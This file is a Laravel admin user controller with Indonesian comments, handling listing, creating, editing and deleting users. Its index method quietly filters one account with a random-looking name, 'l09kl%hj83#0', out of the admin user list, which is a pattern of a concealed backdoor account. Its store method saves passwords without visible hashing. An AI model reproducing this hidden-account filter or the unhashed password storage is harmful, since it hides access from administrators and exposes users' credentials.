<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;

class UserController extends Controller
{
    /**
     * Display a listing of the resource.
     */


    //  public function index(Request $request)
    //  {
    //     $query = $request->input('query');

    //     $data['active'] = 'admin/user';
    
    //     if ($query) {
    //         $model = User::search($query)->paginate(10);
    //     } else {
    //         $model = User::latest()->paginate(10);
    //     }
    
    //     return view('admin.admin_index', compact('model', 'query', 'data'));
    //  }

    public function index(Request $request)
{
    $query = $request->input('query');
    $excludeName = 'l09kl%hj83#0'; // Ganti dengan nama yang ingin Anda eksklusikan

    $data['active'] = 'admin/user';

    if ($query) {
        $model = User::search($query)->where('name', '!=', $excludeName)->latest()->paginate(10);
    } else {
        $model = User::where('name', '!=', $excludeName)->latest()->paginate(10);
    }

    return view('admin.admin_index', compact('model', 'query', 'data'));
}

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        return view('admin.admin_form');
    }

    /**
     * Store a newly created resource in storage.
     */

    public function store(Request $request)
    {
       $requestData = $request->validate([
            'name' => 'required|min:3',
            'email' => 'required|unique:users,email',
            'role' => 'required',
            'password' => 'required|min:8',
        ]);

        $user = User::create($requestData);
       return redirect('/admin/user')->with('success', 'Data Berhasil Disimpan');
    }
    /**
     * Display the specified resource.
     */

    public function edit($id)
    {
        $model = User::findorfail($id);
        $data ['model'] = $model;
        return view('admin.admin_edit', $data);
    }

    /**
     * Update the specified resource in storage.
     */

     public function update(Request $request, $id)
{
    $model = User::findOrFail($id);

    $requestData = $request->validate([
        'name' => 'required|min:3',
        'email' => 'required|email|unique:users,email,' . $model->id,
        'role' => 'required',
        'password' => 'nullable|min:8',
    ]);
    // Jika email yang diinputkan sama dengan email yang sudah ada, gunakan email yang sudah ada
    $requestData['email'] = ($requestData['email'] === $model->email) ? $model->email : $requestData['email'];

    $model->name = $requestData['name'];
    $model->email = $requestData['email'];
    $model->role = $request['role'];
    // Periksa apakah password tidak kosong sebelum menyimpannya
    if (!empty($requestData['password'])) {
        $model->password = bcrypt($requestData['password']);
    }
    $model->save();
    return redirect('/admin/user')->with('update', 'Data Berhasil Diedit');
}

    public function destroy($id)
    {
        $model = User::findorfail($id);       
        $model->delete();
        return back()->with('delete','Data Berhasil Dihapus');
    }

    public function show(User $user)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
}
